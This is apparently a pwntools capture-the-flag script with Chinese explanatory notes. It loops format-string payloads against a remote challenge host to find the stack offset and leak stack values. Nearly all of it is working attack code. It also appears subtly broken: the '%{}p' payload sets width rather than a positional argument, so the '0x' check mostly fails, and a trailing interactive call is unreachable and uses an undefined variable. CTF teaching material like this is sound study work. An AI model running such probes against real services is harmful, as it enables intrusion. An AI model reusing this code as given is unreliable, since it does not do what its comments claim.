from pwn import *
from LibcSearcher import *

#context(arch = "amd64",os = 'linux',log_level = 'debug')
#context(arch = "i386",os = 'linux',log_level = 'debug')

#io = process("./pwn")
context.log_level = 'error'

# test = b'aaaaaaa' + b'%p ' * 50：用于测试格式化字符串的偏移量
test = b'aaaaaaa' + b'%p ' * 50

# offset = 6：格式化字符串的偏移量
offset = 6

# leak函数：测试指定偏移量的格式化字符串
# 用于确定格式化字符串的正确偏移量
def leak(payload):
    io = remote('pwn.challenge.ctf.show', 28232)
    io.recv()
    io.sendline(payload)
    data = io.recvuntil('\n', drop=True)
    if data.startswith(b'0x'):
        print(p64(int(data, 16)))
    io.close()

# 循环测试不同的偏移量
i = 1
while 1:
    payload = '%{}p'.format(i)
    leak(payload)
    i += 1

io.interactive()

"""
【知识点讲解】
1. 题目类型：fmtstr - 格式化字符串偏移量测试
2. 核心原理：
   - 通过循环测试不同的偏移量，确定格式化字符串的正确偏移
   - 用于确定可控数据在栈上的位置
3. 关键步骤：
   - 定义leak函数，测试指定偏移量的格式化字符串
   - 循环测试从1开始的偏移量
   - 打印返回的地址值
4. 执行流程：
   - 循环发送不同偏移量的格式化字符串
   - 接收并打印返回的地址
   - 直到找到正确的偏移量
5. 技术要点：
   - 格式化字符串的偏移量是指可控数据在栈上的位置
   - 通过%p格式化符读取栈上的数据
   - 常用于确定fmtstr_payload的第一个参数
"""
